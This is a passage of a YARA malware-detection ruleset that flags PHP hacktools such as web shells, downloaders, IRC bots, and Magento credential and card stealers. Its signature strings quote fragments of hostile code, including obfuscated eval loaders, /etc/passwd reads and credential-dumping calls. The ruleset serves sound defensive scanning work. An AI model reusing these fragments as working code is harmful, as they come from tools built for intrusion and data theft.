        $ps0 = "By - MrJoker</title>"
    condition:
        $ps0
}

rule php_hacktool_deface_checker_002 : hacktool
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR03972
}

rule php_hacktool_directory_scanner_001 : hacktool
{
    strings:
        $trigger = "eval(base64_decode($scanconfig));"
    condition:
        $trigger
}

private rule PR03973 : trigger
{
    strings:
        $ps0 = "function getHost($url) {"
    condition:
        $ps0
}

private rule PR03974 : trigger
{
    strings:
        $ps0 = "if(is_dir($tdir.$sd) and substr($sd"
    condition:
        $ps0
}

rule php_hacktool_directory_scanner_002 : hacktool
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR03973 and PR03974 and PR00397
}

private rule PR03975 : trigger
{
    strings:
        $ps0 = "$red_code = \"<?php\\nheader('Location: http:"
    condition:
        $ps0
}

rule php_hacktool_doc_redirector_installer_001 : hacktool
{
    strings:
        $trigger = ".docm');\\n?>\";"
    condition:
        $trigger and PR03975
}

private rule PR03976 : trigger
{
    strings:
        $ps0 = "file_get_contents(\"php://input\")); curl_setopt($curl, CURLOPT_REFERER, $_SERVER['REMOTE_ADDR']"
    condition:
        $ps0
}

rule php_hacktool_doorwaygen_002 : hacktool
{
    strings:
        $trigger = "_gate_path); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT"
    condition:
        $trigger and PR03976 and PR01021
}

rule php_hacktool_dork_scanner_001 : hacktool
{
    strings:
        $trigger = "googleResult[$victim"
    condition:
        $trigger and PR01401
}

rule php_hacktool_doserscript_001 : hacktool
{
    strings:
        $trigger = "DOSER SCRIPT"
    condition:
        $trigger and PR00042
}

private rule PR03977 : trigger
{
    strings:
        $ps0 = "fwrite($f,get_download($_GET["
    condition:
        $ps0
}

rule php_hacktool_downloader_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03977
}

private rule PR03978 : trigger
{
    strings:
        $ps0 = "$data = get_download($update_url.'?id=1&bad&host='"
    condition:
        $ps0
}

rule php_hacktool_downloader_002 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03978
}

private rule PR03979 : trigger
{
    strings:
        $ps0 = "$ph = bin2hex( mhash( MHASH_SHA256, $_GET["
    condition:
        $ps0
}

rule php_hacktool_downloader_003 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03979 and PR00355 and PR01392 and PR00357
}

private rule PR03980 : trigger
{
    strings:
        $ps0 = "onclick=\"if(confirm(\\'download?\\')){window.open("
    condition:
        $ps0
}

private rule PR03981 : trigger
{
    strings:
        $ps0 = "style=\"border-collapse: collapse; display:none;\""
    condition:
        $ps0
}

rule php_hacktool_downloader_004 : hacktool
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03980 and PR01648 and PR01021 and PR03981
}

private rule PR03982 : trigger
{
    strings:
        $ps0 = "Coded By : MrJoker"
    condition:
        $ps0
}

rule php_hacktool_downloader_005 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR03982 and PR00357
}

rule php_hacktool_downloader_006 : hacktool
{
    strings:
        $trigger = "$urls[$request_count] = \"ftp://\" . $login . \":\" . $password . \"@\" . $domain;"
    condition:
        $trigger and PR00675
}

// MANUAL FIX NECESSARY
private rule PR03983 : trigger
{
    strings:
        $ps0 = "CURLOPT_COOKIEFILE,$GLOBALS['coki']);"
    condition:
        $ps0
}

rule php_hacktool_downloader_007 : hacktool
{
    strings:
        $trigger = "eval"
        $php_hacktool_downloader_007_r0 = /eval[\s]*\(.\?>.\.\$/
    condition:
        $trigger and PR03983 and $php_hacktool_downloader_007_r0
}

rule php_hacktool_downloader_007_02 : hacktool
{
    strings:
        $trigger = "eval"
    condition:
        $trigger and PR03983 and PR01392
}

// MANUAL FIX NECESSARY
rule php_hacktool_downloader_007_03 : hacktool
{
    strings:
        $trigger = "eval"
        $php_hacktool_downloader_007_03_r0 = /function [\w]+\([^\)]+url[^\)]*\)[\s]*\{[\s]*/
    condition:
        $trigger and PR03983 and $php_hacktool_downloader_007_03_r0
}

rule php_hacktool_downloader_008 : hacktool
{
    strings:
        $trigger = "$u\\x73er-\\x3e\\x61\\x6c\\x6c\\x63ap\\x73[\\x27\\x61d\\x6d\\x69n\\x69\\x73tra\\x74o\\x72\\x27"
    condition:
        $trigger and PR00029
}

private rule PR03984 : trigger
{
    strings:
        $ps0 = "(\"chmod 0777 {$file}\");"
    condition:
        $ps0
}

private rule PR03985 : trigger
{
    strings:
        $ps0 = "(in_array(strtolower(ini_get('safe_mode'))"
    condition:
        $ps0
}

rule php_hacktool_downloader_009 : hacktool
{
    strings:
        $trigger = "eval($"
    condition:
        $trigger and PR03984 and PR03985 and PR01351
}

private rule PR03986 : trigger
{
    strings:
        $ps0 = "while(!feof($file)) {"
    condition:
        $ps0
}

private rule PR03987 : trigger
{
    strings:
        $ps0 = "getFile(\"http"
    condition:
        $ps0
}

rule php_hacktool_downloader_010 : hacktool
{
    strings:
        $trigger = "fwrit"
    condition:
        $trigger and PR03986 and PR03987
}

private rule PR03988 : trigger
{
    strings:
        $ps0 = "where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_"
    condition:
        $ps0
}

rule php_hacktool_drupal_exploit_group_001 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03988
}

rule php_hacktool_drupal_pwn_001 : hacktool
{
    strings:
        $trigger = "$get = @file_get_contents(\"$tar/?q=user/login\");"
    condition:
        $trigger
}

rule php_hacktool_dumper_001 : hacktool
{
    strings:
        $trigger = "<title>nobody - exploit"
    condition:
        $trigger
}

private rule PR03989 : trigger
{
    strings:
        $ps0 = "require 'wp-config.php'"
    condition:
        $ps0
}

private rule PR03990 : trigger
{
    strings:
        $ps0 = "mysqldump"
    condition:
        $ps0
}

rule php_hacktool_dumper_002 : hacktool
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR03491 and PR03989 and PR03990
}

private rule PR03991 : trigger
{
    strings:
        $ps0 = "if (strstr($email[$columns["
    condition:
        $ps0
}

rule php_hacktool_dumper_003 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02507 and PR00507 and PR03991
}

private rule PR03992 : trigger
{
    strings:
        $ps0 = "self::PLATFORM_LINUX"
    condition:
        $ps0
}

private rule PR03993 : trigger
{
    strings:
        $ps0 = "const PLATFORM_UNKNOWN"
    condition:
        $ps0
}

rule php_hacktool_emotet_botnet_001 : hacktool
{
    strings:
        $trigger = "class Rst"
    condition:
        $trigger and PR03992 and PR01436 and PR00029 and PR03993
}

rule php_hacktool_FATT_001 : hacktool
{
    strings:
        $trigger = "<p>FATT has cleaned up and removed itself.</p>"
    condition:
        $trigger and PR01818
}

private rule PR03994 : trigger
{
    strings:
        $ps0 = ">Selamat Datang di AutoLikes"
    condition:
        $ps0
}

rule php_hacktool_fb_hack_001 : hacktool
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR03994
}

private rule PR03995 : trigger
{
    strings:
        $ps0 = "$ser = str_replace(\"_\", \"\", $likeid);"
    condition:
        $ps0
}

rule php_hacktool_fb_hack_002 : hacktool
{
    strings:
        $trigger = "User-Agent"
    condition:
        $trigger and PR03995
}

rule php_hacktool_fb_steal_001 : hacktool
{
    strings:
        $trigger = "<title>Facebook Login Checker"
    condition:
        $trigger
}

private rule PR03996 : trigger
{
    strings:
        $ps0 = "&& fetch_feed($_REQUEST["
    condition:
        $ps0
}

rule php_hacktool_feed_url_001 : hacktool
{
    strings:
        $trigger = "isset($_REQUEST["
    condition:
        $trigger and PR03996
}

private rule PR03997 : trigger
{
    strings:
        $ps0 = "x2', '$OO', 'cache=00', 'file_get_contents("
    condition:
        $ps0
}

rule php_hacktool_file_scanner_001 : hacktool
{
    strings:
        $trigger = "@include"
    condition:
        $trigger and PR03997
}

private rule PR03998 : trigger
{
    strings:
        $ps0 = "$this->SendMSG(\"Transfer type: \".($this->_type==FTP_BINARY"
    condition:
        $ps0
}

rule php_hacktool_ftp_client_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03998
}

rule php_hacktool_ftp_cracker_001 : hacktool
{
    strings:
        $trigger = "panel & FTP Cracker"
    condition:
        $trigger and PR01398
}

private rule PR03999 : trigger
{
    strings:
        $ps0 = "panel & FTP Checker"
    condition:
        $ps0
}

rule php_hacktool_ftp_cracker_001_02 : hacktool
{
    strings:
        $trigger = "eval(base64_decode"
    condition:
        $trigger and PR03999
}

rule php_hacktool_fulldeldir_001 : hacktool
{
    strings:
        $trigger = ".$file)&&($file!=\".\")&&($file!=\"..\")){full_del_dir"
    condition:
        $trigger
}

private rule PR04000 : trigger
{
    strings:
        $ps0 = "function rrmdir($dir)"
    condition:
        $ps0
}

private rule PR04001 : trigger
{
    strings:
        $ps0 = "$directory = $_REQUEST['action'];"
    condition:
        $ps0
}

private rule PR04002 : trigger
{
    strings:
        $ps0 = "link"
    condition:
        $ps0
}

rule php_hacktool_fulldeldir_002 : hacktool
{
    strings:
        $trigger = "if (is_dir($dir"
    condition:
        $trigger and PR04000 and PR04001 and PR04002
}

private rule PR04003 : trigger
{
    strings:
        $ps0 = "rmdir($dir"
    condition:
        $ps0
}

private rule PR04004 : trigger
{
    strings:
        $ps0 = "if (is_dir($dir"
    condition:
        $ps0
}

rule php_hacktool_fulldeldir_002_02 : hacktool
{
    strings:
        $trigger = "if($_GET[\"error\"] == \"Yes\"){"
    condition:
        $trigger and PR04003 and PR04002 and PR04004
}

rule php_hacktool_fulldeldir_003 : hacktool
{
    strings:
        $trigger = "$files = glob('../../public_html/*"
    condition:
        $trigger and PR02020
}

rule php_hacktool_fulldeldir_004 : hacktool
{
    strings:
        $trigger = "unlink(getcwd()"
    condition:
        $trigger and PR04000 and PR04004
}

rule php_hacktool_GDDY_tool_001 : hacktool
{
    strings:
        $trigger = "//GoDaddy Unified PHP Test Script \"GEOFF\""
    condition:
        $trigger and PR00042 and PR00046
}

rule php_hacktool_generic_001 : hacktool
{
    strings:
        $trigger = "system($cmd . ' 1>/dev/null 2>/dev/null', $code);"
    condition:
        $trigger
}

private rule PR04005 : trigger
{
    strings:
        $ps0 = "Ip Lookup Reverse Domain by"
    condition:
        $ps0
}

rule php_hacktool_generic_003 : hacktool
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR04005
}

private rule PR04006 : trigger
{
    strings:
        $ps0 = "GetFileInfo($_POST['file'],$_POST['isroot']);"
    condition:
        $ps0
}

rule php_hacktool_generic_005 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04006
}

rule php_hacktool_generic_006 : hacktool
{
    strings:
        $trigger = "file_get_contents(dirname(__FILE__) .\"/\". $savefile);"
    condition:
        $trigger and PR00355 and PR00357
}

private rule PR04007 : trigger
{
    strings:
        $ps0 = "Cyb3r_Sw0rd"
    condition:
        $ps0
}

rule php_hacktool_generic_007 : hacktool
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR04007
}

rule php_hacktool_generic_008 : hacktool
{
    strings:
        $trigger = "<link rel=\"SHORTCUT ICON\" href=\"http://xxx-hacker.net"
    condition:
        $trigger and PR00042
}

rule php_hacktool_generic_009 : hacktool
{
    strings:
        $trigger = "%74%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64%66%70%6e%72"
    condition:
        $trigger and PR00029 and PR00265
}

private rule PR04008 : trigger
{
    strings:
        $ps0 = "Idea Conceived By coolsurfer@gmail.com"
    condition:
        $ps0
}

rule php_hacktool_generic_010 : hacktool
{
    strings:
        $trigger = "\"==Multipart_Boundary_x{$semi_rand}x\";"
    condition:
        $trigger and PR00437 and PR00301 and PR04008
}

private rule PR04009 : trigger
{
    strings:
        $ps0 = "php-findsock-shell - A Findsock Shell"
    condition:
        $ps0
}

rule php_hacktool_generic_013 : hacktool
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR04009
}

rule php_hacktool_generic_014 : hacktool
{
    strings:
        $trigger = "echo '<br>[+] Uname:'.php_uname()."
    condition:
        $trigger
}

private rule PR04010 : trigger
{
    strings:
        $ps0 = "($_POST['username'],$_POST['password'],$_POST['port']"
    condition:
        $ps0
}

rule php_hacktool_generic_015 : hacktool
{
    strings:
        $trigger = "file_POST_contents($_SERVER['DOCUMENT_ROOT'].\"/\".$"
    condition:
        $trigger and PR04010
}

private rule PR04011 : trigger
{
    strings:
        $ps0 = "echo `pkill -U $database`; echo \"Complete\";"
    condition:
        $ps0
}

rule php_hacktool_generic_016 : hacktool
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR04011
}

private rule PR04012 : trigger
{
    strings:
        $ps0 = "<title>404"
    condition:
        $ps0
}

rule php_hacktool_generic_017 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00092 and PR01444 and PR04012
}

rule php_hacktool_generic_018 : hacktool
{
    strings:
        $trigger = "<title>Welcome to Blackhole!"
    condition:
        $trigger
}

rule php_hacktool_generic_019 : hacktool
{
    strings:
        $trigger = "JI82mxLbQ8TRuaK2maHX4ro1MzKt/EikVjyKIi4IymGkrKn"
    condition:
        $trigger and PR01590
}

private rule PR04013 : trigger
{
    strings:
        $ps0 = "window.onload = function(){display(document.getElementById('regex')); setReplace(document.getElementById('replace'))};"
    condition:
        $ps0
}

rule php_hacktool_generic_020 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR04013 and PR00357
}

private rule PR04014 : trigger
{
    strings:
        $ps0 = "shutdown57"
    condition:
        $ps0
}

rule php_hacktool_generic_021 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04014 and PR01444
}

rule php_hacktool_generic_021_02 : hacktool
{
    strings:
        $trigger = ">Your site has been locked, all files are locked."
    condition:
        $trigger and PR00042
}

private rule PR04015 : trigger
{
    strings:
        $ps0 = "domain"
    condition:
        $ps0
}

private rule PR04016 : trigger
{
    strings:
        $ps0 = "getcwd"
    condition:
        $ps0
}

rule php_hacktool_generic_022 : hacktool
{
    strings:
        $trigger = "UPLOAD_FILE_PATH"
    condition:
        $trigger and PR04015 and PR04016
}

private rule PR04017 : trigger
{
    strings:
        $ps0 = "netstat -an | grep -i listen"
    condition:
        $ps0
}

private rule PR04018 : trigger
{
    strings:
        $ps0 = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow"
    condition:
        $ps0
}

private rule PR04019 : trigger
{
    strings:
        $ps0 = "exec"
    condition:
        $ps0
}

rule php_hacktool_generic_023 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04017 and PR04018 and PR04019 and PR01021 and PR00013
}

private rule PR04020 : trigger
{
    strings:
        $ps0 = "]])){if(strstr($"
    condition:
        $ps0
}

private rule PR04021 : trigger
{
    strings:
        $ps0 = "]], \"@\")){echo $"
    condition:
        $ps0
}

rule php_hacktool_generic_024 : hacktool
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR04020 and PR04021
}

private rule PR04022 : trigger
{
    strings:
        $ps0 = "array_unique($"
    condition:
        $ps0
}

private rule PR04023 : trigger
{
    strings:
        $ps0 = "etc/trueuserowners"
    condition:
        $ps0
}

rule php_hacktool_generic_025 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR04022 and PR04023
}

rule php_hacktool_generic_026 : hacktool
{
    strings:
        $trigger = "trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($secret), base64_decode($string), MCRYPT_MODE_CBC, md5(md5($secret))));"
    condition:
        $trigger and PR00029
}

private rule PR04024 : trigger
{
    strings:
        $ps0 = "@file_get_contents("
    condition:
        $ps0
}

private rule PR04025 : trigger
{
    strings:
        $ps0 = "$this->mySQL->locate_fatt_sql();"
    condition:
        $ps0
}

private rule PR04026 : trigger
{
    strings:
        $ps0 = "if(PHP_SHLIB_SUFFIX == 'dll'){"
    condition:
        $ps0
}

rule php_hacktool_generic_027 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00507 and PR04024 and PR04025 and PR04026
}

private rule PR04027 : trigger
{
    strings:
        $ps0 = "scandir("
    condition:
        $ps0
}

rule php_hacktool_generic_028 : hacktool
{
    strings:
        $trigger = "deleteDir($dir.'/'.$indv_file1);"
    condition:
        $trigger and PR04027 and PR01382
}

private rule PR04028 : trigger
{
    strings:
        $ps0 = "7b15f+M4jgD69+zvt99B5cl0kkk"
    condition:
        $ps0
}

rule php_hacktool_generic_029 : hacktool
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR04028
}

private rule PR04029 : trigger
{
    strings:
        $ps0 = "get_user_by('login', $_POST["
    condition:
        $ps0
}

rule php_hacktool_generic_030 : hacktool
{
    strings:
        $trigger = "if(in_array('administrator',"
    condition:
        $trigger and PR04029 and PR00391 and PR00392
}

rule php_hacktool_generic_031 : hacktool
{
    strings:
        $trigger = "<title>Search in</title>"
    condition:
        $trigger and PR01330 and PR00046
}

private rule PR04030 : trigger
{
    strings:
        $ps0 = "<title># Parallels Windows Bypasser"
    condition:
        $ps0
}

rule php_hacktool_generic_032 : hacktool
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR02356 and PR01021 and PR04030
}

private rule PR04031 : trigger
{
    strings:
        $ps0 = "LS0tLS1CRUdJTiBSU0EgUFJJVkF"
    condition:
        $ps0
}

private rule PR04032 : trigger
{
    strings:
        $ps0 = "openssl_private_decrypt($"
    condition:
        $ps0
}

rule php_hacktool_generic_034 : hacktool
{
    strings:
        $trigger = "header('Location: ' . $"
    condition:
        $trigger and PR01468 and PR04031 and PR01899 and PR04032 and PR01431
}

rule php_hacktool_generic_035 : hacktool
{
    strings:
        $trigger = "\\x2f\\x68\\x6f\\x6d\\x65\\x32\\x2f\\x67\\x69\\x75\\x6c"
    condition:
        $trigger and PR00675
}

private rule PR04033 : trigger
{
    strings:
        $ps0 = "Googlebot"
    condition:
        $ps0
}

private rule PR04034 : trigger
{
    strings:
        $ps0 = "= @unserialize(gzinflate(file_get_contents("
    condition:
        $ps0
}

rule php_hacktool_generic_036 : hacktool
{
    strings:
        $trigger = "HTTP_ACCEPT_LANGUAGE"
    condition:
        $trigger and PR02163 and PR04033 and PR04034 and PR00431
}

private rule PR04035 : trigger
{
    strings:
        $ps0 = "while(false !== ( $file = readdir($"
    condition:
        $ps0
}

private rule PR04036 : trigger
{
    strings:
        $ps0 = "rrmdir($"
    condition:
        $ps0
}

rule php_hacktool_generic_038 : hacktool
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR04035 and PR04036 and PR00046
}

rule php_hacktool_generic_039 : hacktool
{
    strings:
        $trigger = "=substr(hash(base64_decode('"
    condition:
        $trigger
}

rule php_hacktool_generic_039_02 : hacktool
{
    strings:
        $trigger = "Key to Code ifany  <input type=\"text\" name=\"key\"><br>"
    condition:
        $trigger and PR00039
}

rule php_hacktool_generic_041 : hacktool
{
    strings:
        $trigger = "user_hash_password($_GET["
    condition:
        $trigger and PR02521
}

private rule PR04037 : trigger
{
    strings:
        $ps0 = "nl2br(file_get_contents($path . \"/logs.txt\"))"
    condition:
        $ps0
}

rule php_hacktool_generic_042 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04037
}

private rule PR04038 : trigger
{
    strings:
        $ps0 = "write_log($log_filename);"
    condition:
        $ps0
}

rule php_hacktool_generic_043 : hacktool
{
    strings:
        $trigger = "\"User: \".$ip.' - '.date(\"d.m.Y, g:i a\").PHP_EOL;"
    condition:
        $trigger and PR00435 and PR04038
}

private rule PR04039 : trigger
{
    strings:
        $ps0 = "$file_chmod=getChmod($"
    condition:
        $ps0
}

rule php_hacktool_generic_044 : hacktool
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR04027 and PR04039
}

private rule PR04040 : trigger
{
    strings:
        $ps0 = "/etc/valiases/$______\"));$"
    condition:
        $ps0
}

rule php_hacktool_generic_045 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04040
}

rule php_hacktool_generic_047 : hacktool
{
    strings:
        $trigger = "zone-h.com/notify/single"
    condition:
        $trigger and PR01330 and PR00046
}

private rule PR04041 : trigger
{
    strings:
        $ps0 = "->load_useragent_list("
    condition:
        $ps0
}

private rule PR04042 : trigger
{
    strings:
        $ps0 = "trim(fgets($"
    condition:
        $ps0
}

rule php_hacktool_generic_048 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04041 and PR04042 and PR00357
}

rule php_hacktool_generic_049 : hacktool
{
    strings:
        $trigger = "pack('H*','4065727"
    condition:
        $trigger and PR01550
}

rule php_hacktool_generic_050 : hacktool
{
    strings:
        $trigger = "Escanor0xtn"
    condition:
        $trigger and PR00042
}

rule php_hacktool_gmailverify_001 : hacktool
{
    strings:
        $trigger = "fopen('not_gmail.txt', 'a+');"
    condition:
        $trigger and PR01401
}

private rule PR04043 : trigger
{
    strings:
        $ps0 = "$hasil = googling($q,$m);"
    condition:
        $ps0
}

rule php_hacktool_googler_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04043
}

rule php_hacktool_googler_002 : hacktool
{
    strings:
        $trigger = "if(empty($_COOKIE) && $_SERVER[\"REQUEST_URI\"]=='/google"
    condition:
        $trigger
}

private rule PR04044 : trigger
{
    strings:
        $ps0 = "* plugin_googlemap2_proxy.php,v "
    condition:
        $ps0
}

rule php_hacktool_googler_003 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04044
}

private rule PR04045 : trigger
{
    strings:
        $ps0 = ">highlight_file</font></h1>\";"
    condition:
        $ps0
}

private rule PR04046 : trigger
{
    strings:
        $ps0 = "if(empty($_POST["
    condition:
        $ps0
}

rule php_hacktool_highlight_file_001 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04045 and PR04046
}

rule php_hacktool_hungerEK_001 : hacktool
{
    strings:
        $trigger = "<title>Hunter Exploit Kit</title>"
    condition:
        $trigger
}

rule php_hacktool_inboxmailer_001 : hacktool
{
    strings:
        $trigger = "<span class=\"style1\">Welcome to Inbox Mailer?<br>"
    condition:
        $trigger
}

private rule PR04047 : trigger
{
    strings:
        $ps0 = "echo php_uname()"
    condition:
        $ps0
}

rule php_hacktool_ini_settings_001 : hacktool
{
    strings:
        $trigger = "=@ini_get('disable_functions'))){echo \"<font color=green>NONE</font></b>\";}else{echo"
    condition:
        $trigger and PR04047
}

private rule PR04048 : trigger
{
    strings:
        $ps0 = "ZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZU5xVlZndHoya1lRL2l2RXd4UTBKcTRraEVDbGF1"
    condition:
        $ps0
}

rule php_hacktool_ini_settings_002 : hacktool
{
    strings:
        $trigger = ".chr"
    condition:
        $trigger and PR04048
}

private rule PR04049 : trigger
{
    strings:
        $ps0 = "{$_SESSION[\"c1\"]}--exploit-get{$_SESSION[\"c0\"]}"
    condition:
        $ps0
}

rule php_hacktool_inurlbr_001 : hacktool
{
    strings:
        $trigger = "PHPShell"
    condition:
        $trigger and PR04049
}

private rule PR04050 : trigger
{
    strings:
        $ps0 = ".die //kill the bot"
    condition:
        $ps0
}

rule php_hacktool_ircbot_002 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04050
}

private rule PR04051 : trigger
{
    strings:
        $ps0 = "eeLCoMz AI PHPBot"
    condition:
        $ps0
}

rule php_hacktool_ircbot_003 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04051
}

private rule PR04052 : trigger
{
    strings:
        $ps0 = "class pBot"
    condition:
        $ps0
}

rule php_hacktool_ircbot_005 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04052
}

private rule PR04053 : trigger
{
    strings:
        $ps0 = ",\".raw <cmd> [raw IRC command]\");"
    condition:
        $ps0
}

rule php_hacktool_ircbot_006 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04053
}

rule php_hacktool_ircbot_007 : hacktool
{
    strings:
        $trigger = "base64_decode('7b10e+M6siD87My38zznP7A1vSt7HBQsOWe"
    condition:
        $trigger
}

private rule PR04054 : trigger
{
    strings:
        $ps0 = "\"POST \".$p.\"/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
    condition:
        $ps0
}

rule php_hacktool_jce_exploit_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04054
}

rule php_hacktool_jce_exploit_002 : hacktool
{
    strings:
        $trigger = "9d09f693c63c1988a9f8a564e0da7743; jce_imgmanager_dir=%2F;',CURLOPT_URL => rtrim"
    condition:
        $trigger and PR00013
}

rule php_hacktool_joomla_bruteforce_001 : hacktool
{
    strings:
        $trigger = "Joomla Brute Forcer"
    condition:
        $trigger
}

rule php_hacktool_litespeed_bypass_001 : hacktool
{
    strings:
        $trigger = "echo '<star>';eval(base64_decode(str_replace(\" \", \"+\", join(array_slice($a,count($a)-3)))));echo '</star>'"
    condition:
        $trigger and PR00507
}

rule php_hacktool_litespeed_bypass_001_02 : hacktool
{
    strings:
        $trigger = "izocin priv9</title>"
    condition:
        $trigger and PR00042
}

private rule PR04055 : trigger
{
    strings:
        $ps0 = "= file_get_contents( '/etc/passwd' );"
    condition:
        $ps0
}

rule php_hacktool_local_root_exploit_001 : hacktool
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00507 and PR04055
}

rule php_hacktool_lombokcyber_encoder_001 : hacktool
{
    strings:
        $trigger = "protected by MessPHP v"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR04056 : trigger
{
    strings:
        $ps0 = "class Mage_"
    condition:
        $ps0
}

private rule PR04057 : trigger
{
    strings:
        $ps0 = "$message = $username.'"
    condition:
        $ps0
}

private rule PR04058 : trigger
{
    strings:
        $ps0 = "Mage_Admin"
    condition:
        $ps0
}

rule php_hacktool_magentocredentialstealer_001 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04056 and PR04057 and PR04058
}

private rule PR04059 : trigger
{
    strings:
        $ps0 = "/app/etc/local.xml"
    condition:
        $ps0
}

rule php_hacktool_magentocredentialstealer_002 : hacktool
{
    strings:
        $trigger = "title>MAGENTO - stealing information"
    condition:
        $trigger and PR04059
}

rule php_hacktool_magentocredentialstealer_003 : hacktool
{
    strings:
        $trigger = "$emailboss = $username;"
    condition:
        $trigger and PR04056
}

private rule PR04060 : trigger
{
    strings:
        $ps0 = "umask(0);"
    condition:
        $ps0
}

private rule PR04061 : trigger
{
    strings:
        $ps0 = "$user = Mage::getModel('admin/user')->loadByUsername("
    condition:
        $ps0
}

private rule PR04062 : trigger
{
    strings:
        $ps0 = "header('Location: ' . $redirectUrl);"
    condition:
        $ps0
}

private rule PR04063 : trigger
{
    strings:
        $ps0 = "$redirectUrl = Mage::getSingleton('adminhtml/url')->getUrl(Mage::getModel('admin/user')->getStartupPageUrl(), array('_current' => false));"
    condition:
        $ps0
}

rule php_hacktool_magentocredentialstealer_004 : hacktool
{
    strings:
        $trigger = "require_once MAGENTO . '/../app/Mage.php';"
    condition:
        $trigger and PR04060 and PR04061 and PR04062 and PR00265 and PR04063
}

rule php_hacktool_magentocredentialstealer_005 : hacktool
{
    strings:
        $trigger = "getenv(\"REMOTE_ADDR\");$isi=\"Ip : $ip\\nUsermail: $username\\nPassword"
    condition:
        $trigger and PR00301 and PR01123
}

rule php_hacktool_magentodatastealer_001 : hacktool
{
    strings:
        $trigger = "echo \"<b>CC ORDER PAYMENT"
    condition:
        $trigger and PR04059
}

rule php_hacktool_magentodatastealer_002 : hacktool
{
    strings:
        $trigger = "Magento Customer Email Dumper"
    condition:
        $trigger and PR04059
}

rule php_hacktool_magentodatastealer_003 : hacktool
{
    strings:
        $trigger = "Read DB---------[M A G"
    condition:
        $trigger and PR04059
}

private rule PR04064 : trigger
{
    strings:
        $ps0 = "uto exploiter"
    condition:
        $ps0
}

rule php_hacktool_magentodatastealer_004 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04064 and PR00391
}

private rule PR04065 : trigger
{
    strings:
        $ps0 = "/app/code/core/Mage"
    condition:
        $ps0
}

private rule PR04066 : trigger
{
    strings:
        $ps0 = "\"base\".\"64\".\"_\".\"de\".\"code\""
    condition:
        $ps0
}

rule php_hacktool_magentodatastealer_005 : hacktool
{
    strings:
        $trigger = " * @category   Mage"
    condition:
        $trigger and PR04065 and PR04066 and PR02458 and PR01012
}

rule php_hacktool_magentodatastealer_006 : hacktool
{
    strings:
        $trigger = "array('result'=>@unlink(__FILE__));"
    condition:
        $trigger and PR04059
}

private rule PR04067 : trigger
{
    strings:
        $ps0 = "fopen(\"door.txt"
    condition:
        $ps0
}

rule php_hacktool_magentodatastealer_007 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR04067
}

private rule PR04068 : trigger
{
    strings:
        $ps0 = "app/Mage.php"
    condition:
        $ps0
}

rule php_hacktool_magento_admin_002 : hacktool
{
    strings:
        $trigger = "setRoleIds(array($role->getId()))"
    condition:
        $trigger and PR04068
}

private rule PR04069 : trigger
{
    strings:
        $ps0 = "zipCommand(getcwd(), $_SERVER['HTTP_HOST']);"
    condition:
        $ps0
}

rule php_hacktool_magento_admin_003 : hacktool
{
    strings:
        $trigger = "if (isset($_GET['ph'])) enablePh();"
    condition:
        $trigger and PR00042 and PR00281 and PR04069
}

private rule PR04070 : trigger
{
    strings:
        $ps0 = "'JPEG-1.1'"
    condition:
        $ps0
}

private rule PR04071 : trigger
{
    strings:
